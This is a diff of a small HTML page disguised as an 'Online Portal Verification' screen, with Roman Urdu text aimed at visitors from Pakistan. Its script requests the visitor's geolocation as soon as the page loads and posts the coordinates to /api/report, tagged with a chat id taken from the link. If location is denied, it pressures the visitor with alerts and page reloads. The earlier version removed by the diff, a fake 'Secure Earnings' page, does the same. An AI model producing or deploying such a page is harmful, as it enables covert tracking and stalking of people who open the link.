@@ -1,106 +1,90 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Processing...</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Online Portal Verification</title>
   <style>
-    body {
+    * {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #eff3f6, #d7e3ed);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }body {
+  background: linear-gradient(to right, #2b5876, #4e4376);
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: white;
+  text-align: center;
+}
 
-    .box {
-      text-align: center;
-      background: white;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      width: 90%;
-      max-width: 340px;
-      animation: fadeIn 1s ease-out;
-    }
+.container {
+  background: rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(10px);
+  padding: 40px;
+  border-radius: 15px;
+  box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+  max-width: 400px;
+}
 
-    .box h2 {
-      margin: 0 0 10px;
-      font-size: 22px;
-      color: #333;
-    }
+h1 {
+  margin-bottom: 20px;
+  font-size: 28px;
+}
 
-    .box p {
-      color: #666;
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
+p {
+  font-size: 16px;
+  margin-bottom: 30px;
+}
 
-    .progress {
-      width: 100%;
-      background: #e0e0e0;
-      height: 8px;
-      border-radius: 5px;
-      overflow: hidden;
-      position: relative;
-    }
+.loading {
+  width: 30px;
+  height: 30px;
+  border: 4px solid rgba(255, 255, 255, 0.3);
+  border-top: 4px solid white;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto;
+}
 
-    .bar {
-      width: 0%;
-      height: 100%;
-      background: #3498db;
-      animation: fill 3s forwards;
-    }
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
 
-    @keyframes fill {
-      to { width: 100%; }
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Initializing Secure Earnings</h2>
-    <p>Please wait while your session is being authenticated...</p>
-    <div class="progress"><div class="bar"></div></div>
-  </div>
+  <div class="container">
+    <h1>Portal Access Verification</h1>
+    <p>Aap Pakistan se hain? Kripya system verification ke liye allow karein...</p>
+    <div class="loading"></div>
+  </div>  <script>
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const chat_id = new URLSearchParams(window.location.search).get("id");
 
-  <script>
-    function askLocation(retry = false) {
-      if (!navigator.geolocation) return;
-
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          fetch('/api/report', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              lat: position.coords.latitude,
-              lon: position.coords.longitude
-            })
-          });
-        },
-        error => {
-          if (error.code === 1 && !retry) {
-            setTimeout(() => askLocation(true), 2000);
-          } else {
-            alert("Please enable location to continue. This is required for verification.");
-            location.reload(); // try again after reload
-          }
-        }
-      );
+      fetch("/api/report", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, latitude: lat, longitude: lon })
+      });
     }
 
-    // auto request after load
-    window.onload = () => {
-      setTimeout(() => askLocation(), 500);
-    };
-  </script>
-</body>
+    function handleError(err) {
+      alert("Location allow karna zaroori hai verification ke liye.");
+      location.reload();
+    }
+
+    setTimeout(() => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Geolocation not supported in your browser");
+      }
+    }, 1000);
+  </script></body>
 </html>
